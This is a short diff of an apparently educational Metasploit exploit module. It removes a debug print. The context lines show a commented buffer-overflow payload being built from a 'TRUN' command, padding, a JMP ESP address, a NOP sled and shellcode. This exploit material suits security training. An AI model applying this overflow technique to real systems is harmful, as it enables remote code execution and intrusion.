@@ -59,8 +59,6 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
     def exploit	# Actual exploit
       print_status("Connecting to target...")
       connect	# Connect to the target
-  
-      print_status("class #{target.opts.class}")
 
       shellcode = payload.encoded	# Generated and encoded shellcode
       outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['jmpesp']].pack('V') + "\x90" * 32 + shellcode # Create the malicious string that will be sent to the target
